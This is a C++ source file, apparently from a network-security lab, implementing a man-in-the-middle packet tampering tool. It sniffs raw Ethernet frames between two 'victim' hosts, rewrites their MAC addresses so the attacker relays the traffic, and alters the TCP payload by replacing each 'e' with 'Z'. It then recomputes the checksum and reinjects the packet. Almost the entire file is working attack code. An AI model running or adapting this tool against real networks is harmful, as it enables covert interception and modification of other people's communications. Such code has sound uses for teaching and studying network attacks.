#include<bits/stdc++.h>
#include <sys/socket.h> // for socket, PF_PACKET, SOCK_RAW
#include <netinet/in.h> // for IPPROTO_TCP
#include <arpa/inet.h> // for htons, IPPROTO_TCP
#include <netinet/if_ether.h> // ETH_P_ALL decided not to use only tcp packet will suffice
#include <unistd.h> // close()
#include <linux/ip.h> // for iphdr
#include <linux/tcp.h> // for tcphdr
#include <linux/if_packet.h> // for sockaddr_ll
#include <sys/ioctl.h> // for ioctl
#include <net/if.h> // for freq
#include <netinet/ether.h> // ether_aton
using namespace std;
unsigned char vicitim1MAC[6];
unsigned char vicitim2MAC[6];
unsigned char attackerMAC[6];
uint32_t victim1IP;
uint32_t victim2IP;
uint32_t attackerIP;
int rawSocket;

string SRC_MAC; //"02:42:0a:09:00:05"
string DST_MAC; // "02:42:0a:09:00:06"
string ATT_MAC; // "02:42:0a:09:00:69"
string SRC_IP; // "10.9.0.5"
string DST_IP; // "10.9.0.6"
string ATT_IP; // "10.9.0.105"



typedef struct PseudoHeader
{
    uint32_t  sourceIP;
    uint32_t  destIP;
    unsigned char reserved;
    unsigned char protcol;
    uint16_t  segmentLength;
}PseudoHeader;

void printPacket(unsigned char* buf, int bufSize)
{
    cout<<"--------packet starts---------"<<endl;
    for(int i=0;i<bufSize;i++)
    {
        short t = buf[i];
        printf("%.2x ",t);
    }
    cout<<endl;
    cout<<"--------packet ends---------"<<endl;
}

void printUnsignedCharArr(char *verbose, unsigned char* buf, int bufSize)
{
    cout<<verbose;
    for(int i=0;i<bufSize;i++)
    {
        short t = buf[i];
        printf("%.2x ",t);
    }
    cout<<endl;
}

int parsePacket(unsigned char* buf, int bufSize)
{

    // struct ethhdr *eth = (struct ethhdr *)buf;
    // printf("Ethernet Header: \n");
    // printf("Destination MAC: %s",eth->h_dest);
    // printf("Source MAC: %s",eth->h_source);
    // printf("Payload Type: %x",eth->h_proto);
    struct ethhdr* ethHeader;
    // stringstream ss;
    if(bufSize >= sizeof(struct ethhdr))
    {
        ethHeader = (struct ethhdr*) buf;
        printUnsignedCharArr("Destination MAC: ",ethHeader->h_dest,6);
        printUnsignedCharArr("Source MAC: ",ethHeader->h_source,6);
        printUnsignedCharArr("Protocol Type: ",(unsigned char*)&ethHeader->h_proto,2);
        printUnsignedCharArr("victim1: ", vicitim1MAC,6);
        printUnsignedCharArr("victim2: ", vicitim2MAC,6);
        // cout<<"hi"<<endl;
        // cout<<atoi((char *)ethHeader->h_source)<<endl;
        
    }
    else
    {
        printf("Ethernet header parsing failed\n");
        return -5;
    }

    bool t1 = memcmp(ethHeader->h_source,vicitim1MAC,6)==0;
    bool t2 = memcmp(ethHeader->h_source,vicitim2MAC,6)==0;
    bool t3 = memcmp(ethHeader->h_dest,vicitim1MAC,6)==0;
    bool t4 = memcmp(ethHeader->h_dest,vicitim2MAC,6)==0;
    
    // cout<<t1<<" "<<t2<<" "<<t3<<" "<<t4<<endl;
    if((t1||t2||t3||t4) == false)
    {
        cout<<"Not a victim packet so won't be parse"<<endl;
        return -5;
    }

    struct iphdr* ipHeader; 
    uint16_t ipv4Protocol = 0x0800;
    if(ntohs(ethHeader->h_proto) == ipv4Protocol) // ipv4 ethertype
    {
        if(bufSize >= (sizeof(struct ethhdr) + sizeof(struct iphdr)))
        {
            ipHeader = (struct iphdr*) (buf+sizeof(struct ethhdr));
            printf("Destination IP: %x\n", ntohl(ipHeader->daddr));
            printf("Source IP: %x\n", ntohl(ipHeader->saddr));
           
        }
    }
    else
    {
        cout<<"Not an IP packet so won't be parsing"<<endl;
        return -5;
    }

    

    struct tcphdr *tcpHeader;
    unsigned char tcpProtocol = 0x06;
    if(ipHeader->protocol== tcpProtocol) // tcp packet
    {
        if(bufSize >= (sizeof(struct ethhdr) + ipHeader->ihl * 4) + sizeof(struct tcphdr))
        {
            tcpHeader = (struct tcphdr*) (buf + sizeof(struct ethhdr) + ipHeader->ihl * 4);
            printf("Destination Port: %d\n",ntohs(tcpHeader->dest));
            printf("Source Port: %d\n",ntohs(tcpHeader->source));
        }
    }
    else
    {
        cout<<"Not an TCP packet so won't be parsing"<<endl;
        return -5;
    }
    unsigned char *payload;
    int payloadLength = 0;
    bool payloadFound = true;
    if(bufSize > sizeof(struct ethhdr) + ipHeader->ihl * 4 + tcpHeader->doff * 4)
    {
        payload = buf + sizeof(struct ethhdr) + ipHeader->ihl * 4 + tcpHeader->doff * 4;
        payloadLength = bufSize - (sizeof(struct ethhdr) + ipHeader->ihl * 4 + tcpHeader->doff * 4);
        cout<<"Payload size: "<<payloadLength<<endl;
        printUnsignedCharArr("Application Layer Data: ",payload,payloadLength);
    }
    else
    {
        cout<<"No payload found"<<endl;
        payloadFound = false;
        
    }

    
    

    




    return 0;
    
}
// this checksum function has bug in it can't handle all the cases.... so i had to stop using it
// unsigned short computeIPChecksum(unsigned char *header, int len)
// {
//     long sum = 0;
//     unsigned short *ipHeader = (unsigned short *) header;

//     while(len>1)
//     {
//         sum += *ipHeader;
//         ipHeader++;
//         if(sum & 0x80000000)
//         {
//             sum = (sum & 0xFFFF) + (sum >> 16);
//         }
//         len -= 2;
//     }

//     if(len)
//     {
//         sum += *ipHeader;
//     }

//     while(sum>>16)
//     {
//         sum = (sum & 0xFFFF) + (sum>>16);
//     }

//     return ~sum;

// }

unsigned short computeIPChecksum(unsigned short *addr, unsigned int count) {
  register unsigned long sum = 0;
  while (count > 1) {
    sum += * addr++;
    count -= 2;
  }
  //if any bytes left, pad the bytes and add
  if(count > 0) {
    sum += ((*addr)&htons(0xFF00));
  }
  //Fold sum to 16 bits: add carrier to result
  while (sum>>16) {
      sum = (sum & 0xffff) + (sum >> 16);
  }
  //one's complement
  sum = ~sum;
  return ((unsigned short)sum);
}

void forwardPacket(unsigned char* buf, int bufSize)
{
    cout<<"inside forwardPacket"<<endl;
    unsigned char* myPacket = new unsigned char[bufSize];
    memcpy(myPacket,buf,bufSize);

    struct ethhdr* ethHeader;
    // stringstream ss;
    if(bufSize >= sizeof(struct ethhdr))
    {
        ethHeader = (struct ethhdr*) myPacket;
        // printUnsignedCharArr("Destination MAC: ",ethHeader->h_dest,6);
        // printUnsignedCharArr("Source MAC: ",ethHeader->h_source,6);
        // printUnsignedCharArr("Protocol Type: ",(unsigned char*)&ethHeader->h_proto,2);
        // printUnsignedCharArr("victim1: ", vicitim1MAC,6);
        // printUnsignedCharArr("victim2: ", vicitim2MAC,6);
        // cout<<"hi"<<endl;
        // cout<<atoi((char *)ethHeader->h_source)<<endl;
        
    }

    bool t1 = memcmp(ethHeader->h_source,vicitim1MAC,6)==0;
    bool t2 = memcmp(ethHeader->h_source,vicitim2MAC,6)==0;
    bool t3 = memcmp(ethHeader->h_dest,vicitim1MAC,6)==0;
    bool t4 = memcmp(ethHeader->h_dest,vicitim2MAC,6)==0;
    bool t5 = memcmp(ethHeader->h_dest,attackerMAC,6)==0;
    cout<<t1<<" "<<t2<<" "<<t3<<" "<<t4<<" "<<t5<<endl;
    // if((t1||t2||t3||t4) == false)
    // {
    //     cout<<"Not a victim packet so won't be parse"<<endl;
    //     return -5;
    // }
    if(t1 && t5)
    {
        memcpy(ethHeader->h_source,attackerMAC,6);
        memcpy(ethHeader->h_dest,vicitim2MAC,6);
        
    }
    else if(t2 && t5)
    {
        memcpy(ethHeader->h_source,attackerMAC,6);
        memcpy(ethHeader->h_dest,vicitim1MAC,6);
    }

    struct iphdr *ipHeader = (struct iphdr *)(myPacket + sizeof(struct ethhdr));
    // ipHeader->ttl = ipHeader->ttl - 1;
    // ipHeader->check = 0;
    // ipHeader->check = (computeIPChecksum((unsigned char *)ipHeader,ipHeader->ihl*4));

    struct tcphdr *tcpHeader = (struct tcphdr *)(myPacket + sizeof(struct ethhdr) + ipHeader->ihl*4);
    tcpHeader->check = 0;
    
    // calculating tcp checksum
    int segmentLength = ntohs(ipHeader->tot_len) - ipHeader->ihl*4;
    cout<<"segment Length: "<<segmentLength<<endl;
    int pseudoAndTCPHeaderLength = sizeof(PseudoHeader) + segmentLength;
    cout<<"Header Length: "<<pseudoAndTCPHeaderLength<<endl; 
    unsigned char *hdr = new unsigned char[pseudoAndTCPHeaderLength];

    PseudoHeader *pseudoHeader = (PseudoHeader *)hdr;
    pseudoHeader->sourceIP = ipHeader->saddr;
    pseudoHeader->destIP = ipHeader->daddr;
    pseudoHeader->reserved = 0;
    pseudoHeader->protcol = ipHeader->protocol;
    pseudoHeader->segmentLength = htons(segmentLength);

    memcpy((hdr+sizeof(PseudoHeader)),(void *)tcpHeader,tcpHeader->doff*4);
    
    unsigned char* payload;
    int payloadLength = 0;
    payload = myPacket + sizeof(struct ethhdr) + ipHeader->ihl * 4 + tcpHeader->doff * 4;
    payloadLength = bufSize - (sizeof(struct ethhdr) + ipHeader->ihl * 4 + tcpHeader->doff * 4);
    cout<<"payload length: "<<payloadLength<<endl;
    ostringstream oss;
    char *s = new char[payloadLength+1];
    
    for(int i = 0; i < payloadLength; ++i) 
    {
        s[i] = +(payload[i]);
    }
    s[payloadLength] = 0;
    string str(s,s+payloadLength);
    cout<<"payload in string: "<<str<<endl;
    int index = 0;
    while (true) {
        /* Locate the substring to replace. */
        index = str.find("e", index);
        if (index == std::string::npos) break;
        cout<<"index: "<<index<<endl;
        /* Make the replacement. */
        str.replace(index, 1, "Z");

        /* Advance index forward so the next iteration doesn't pick it up as well. */
        index += 1;
    }
    for(int i = 0; i < payloadLength; ++i) 
    {
        payload[i] = str[i];
    }

    cout<<"payload in string: "<<str<<endl;

    memcpy((hdr+sizeof(PseudoHeader)+tcpHeader->doff*4),payload,payloadLength);
    
    
    tcpHeader->check = (computeIPChecksum((unsigned short *)hdr,pseudoAndTCPHeaderLength));
    printUnsignedCharArr("checksum hdr: ", hdr,pseudoAndTCPHeaderLength);
    cout<<"tcp header checksum"<<endl;
    
    // cout<<tcpHeader->check<<endl;
    // printf("%x\n",tcpHeader->check);

    // printf("%x\n",ntohs(tcpHeader->check));


    printf("%x\n",htons(tcpHeader->check));
    
    
    
    
    
    
    
    // cout<<"calling parse packet"<<endl;
    // parsePacket(myPacket,bufSize);
    // cout<<"forward closing"<<endl;
    cout<<"sending"<<endl;
    // parsePacket(myPacket,bufSize);
    printUnsignedCharArr("packet in hex:\n",myPacket,bufSize);
    cout<<"total sent: "<<write(rawSocket, myPacket, bufSize)<<endl;
    cout<<"forwarding completed"<<endl;

    
    delete[] hdr;
    delete[] myPacket;
    
}

int filterPacket(unsigned char* buf, int bufSize)
{

    // struct ethhdr *eth = (struct ethhdr *)buf;
    // printf("Ethernet Header: \n");
    // printf("Destination MAC: %s",eth->h_dest);
    // printf("Source MAC: %s",eth->h_source);
    // printf("Payload Type: %x",eth->h_proto);
    struct ethhdr* ethHeader;
    stringstream ss;
    if(bufSize >= sizeof(struct ethhdr))
    {
        ethHeader = (struct ethhdr*) buf;
        // printUnsignedCharArr("Destination MAC: ",ethHeader->h_dest,6);
        // printUnsignedCharArr("Source MAC: ",ethHeader->h_source,6);
        // printUnsignedCharArr("Protocol Type: ",(unsigned char*)&ethHeader->h_proto,2);
        // printUnsignedCharArr("victim1: ", vicitim1MAC,6);
        // printUnsignedCharArr("victim2: ", vicitim2MAC,6);
        // cout<<"hi"<<endl;
        // cout<<atoi((char *)ethHeader->h_source)<<endl;
        
    }
    else
    {
        // printf("Ethernet header parsing failed\n");
        return -5;
    }

    bool t1 = memcmp(ethHeader->h_source,vicitim1MAC,6)==0;
    bool t2 = memcmp(ethHeader->h_source,vicitim2MAC,6)==0;
    bool t3 = memcmp(ethHeader->h_dest,vicitim1MAC,6)==0;
    bool t4 = memcmp(ethHeader->h_dest,vicitim2MAC,6)==0;
    
    // cout<<t1<<" "<<t2<<" "<<t3<<" "<<t4<<endl;
    if((t1||t2||t3||t4) == false)
    {
        // cout<<"Not a victim packet so won't be parse"<<endl;
        return -5;
    }

    struct iphdr* ipHeader; 
    uint16_t ipv4Protocol = 0x0800;
    if(ntohs(ethHeader->h_proto) == ipv4Protocol) // ipv4 ethertype
    {
        if(bufSize >= (sizeof(struct ethhdr) + sizeof(struct iphdr)))
        {
            ipHeader = (struct iphdr*) (buf+sizeof(struct ethhdr));
            // printf("Destination IP: %x\n", ntohl(ipHeader->daddr));
            // printf("Source IP: %x\n", ntohl(ipHeader->saddr));
           
        }
    }
    else
    {
        // cout<<"Not an IP packet so won't be parsing"<<endl;
        return -5;
    }

    

    struct tcphdr *tcpHeader;
    unsigned char tcpProtocol = 0x06;
    if(ipHeader->protocol== tcpProtocol) // tcp packet
    {
        if(bufSize >= (sizeof(struct ethhdr) + ipHeader->ihl * 4) + sizeof(struct tcphdr))
        {
            tcpHeader = (struct tcphdr*) (buf + sizeof(struct ethhdr) + ipHeader->ihl * 4);
            // printf("Destination Port: %d\n",ntohs(tcpHeader->dest));
            // printf("Source Port: %d\n",ntohs(tcpHeader->source));
        }
    }
    else
    {
        // cout<<"Not an TCP packet so won't be parsing"<<endl;
        return -5;
    }
    

    bool t11 = victim1IP == ntohl(ipHeader->daddr);
    bool t22 = victim1IP == ntohl(ipHeader->saddr);
    bool t33 = victim2IP == ntohl(ipHeader->daddr);
    bool t44 = victim2IP == ntohl(ipHeader->saddr);
    // cout<<t11<<" "<<t22<<" "<<t33<<" "<<t44<<endl;
    if(t11 && t44)
    {
        cout<<"from victim2 to victim1 packet"<<endl;
        parsePacket(buf,bufSize);
        forwardPacket(buf,bufSize);
    }
    else if(t22 && t33)
    {
        cout<<"from victim1 to victim2 packet"<<endl;
        parsePacket(buf,bufSize);
        forwardPacket(buf,bufSize);
        // changePacket(buf,bufSize);
    }
    else
    {
        cout<<"not a packet from victim1 to victim2 so won't be injecting packet"<<endl;
        return -5;
    }
    

    




    return 0;
    
}

int bindRawSocketToInterface(char *device, int rawSocket)
{
    cout<<"inside bind socket"<<endl;
    struct sockaddr_ll sll;
    struct ifreq ifr;
    bzero(&sll,sizeof(sll));
    bzero(&ifr,sizeof(ifr));

    strncpy((char *)ifr.ifr_name, device, IFNAMSIZ);
    if((ioctl(rawSocket, SIOCGIFINDEX, &ifr)) == -1 )
    {
        cout<<"error getting interface index"<<endl;
        exit(-1);
    }

    sll.sll_family = PF_PACKET;
    sll.sll_ifindex = ifr.ifr_ifindex;
    sll.sll_protocol = htons(ETH_P_ALL);
    cout<<"calling bind"<<endl;
    if((bind(rawSocket, (struct sockaddr *)&sll, sizeof(sll)))==-1)
    {
        cout<<"error binding raw socket to interface"<<endl;
        exit(-1);
    }
    cout<<"exiting bind"<<endl;
    return 1;

}

int main(int argc, char* argv[])
{
    if(argc!=7)
    {
        cout<<"wrong input format!"<<endl;
        exit(-1);
    }
    SRC_MAC = string(argv[1]);
    DST_MAC = string(argv[2]);
    ATT_MAC = string(argv[3]);
    SRC_IP = string(argv[4]);
    DST_IP = string(argv[5]);
    ATT_IP = string(argv[6]);
    
    memcpy(vicitim1MAC,ether_aton(SRC_MAC.c_str()),6);
    memcpy(vicitim2MAC,ether_aton(DST_MAC.c_str()),6);
    memcpy(attackerMAC,ether_aton(ATT_MAC.c_str()),6);
    victim1IP=ntohl(inet_addr(SRC_IP.c_str())); // 10.9.0.5
    victim2IP=ntohl(inet_addr(DST_IP.c_str())); // 10.9.0.6
    attackerIP=ntohl(inet_addr(ATT_IP.c_str())); // 10.9.0.105
    


    size_t pktBufSize = 10*1024;
    unsigned char pktBuf[pktBufSize];// 10kb space // has to be unsigned otherwise prints bad hex dump
    rawSocket = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if(rawSocket<0)
    {
        cout<<"kill meh"<<endl;
        return -5;
    }
    if(bindRawSocketToInterface("eth0", rawSocket)!=1)
    {
        cout<<"kill meh again"<<endl;
        return -5;
    }
    cout<<"Socket opened successfully"<<endl;
    int totalCaptured = 0;

    // unsigned char temp111[] =  {0x02, 0x42, 0x0a, 0x09, 0x00, 0x69, 0x02, 0x42, 0x0a, 0x09, 0x00, 0x05, 0x08, 0x00, 0x45, 0x00, 0x00, 0x37, 0x43, 0x53, 0x40, 0x00, 0x40, 0x06, 0xe3, 0x51, 0x0a, 0x09, 0x00, 0x05, 0x0a, 0x09, 0x00, 0x06, 0xb7, 0x6e, 0x23, 0x82, 0xc0, 0x63, 0xe1, 0x4a, 0x58, 0x3b, 0xfe, 0x03, 0x80, 0x18, 0x01, 0xf6, 0x14, 0x46, 0x00, 0x00, 0x01, 0x01, 0x08, 0x0a, 0x67, 0x3a, 0xbd, 0x9c, 0x81, 0x31, 0x8a, 0x1a, 0x68, 0x69, 0x0a};
    // int templen = 69;
    // filterPacket(temp111,templen);
    while(true)
    {
        struct sockaddr pktInfo;
        int pktInfoSize = sizeof(pktInfo);
        socklen_t* sizePktInfo = (socklen_t *) &pktInfoSize;
        // cout<<pktInfoSize<<endl;
        ssize_t pktSize = recvfrom(rawSocket,pktBuf,pktBufSize,0,&pktInfo,sizePktInfo);
        int sizeOfPkt = pktSize;
        totalCaptured++;
        cout<<totalCaptured<<" "<<sizeOfPkt<<endl;
        // printPacket(pktBuf,sizeOfPkt);
        filterPacket(pktBuf,sizeOfPkt);
        
    }

    close(rawSocket);
    cout<<"Socket closed"<<endl;
    return 0;
}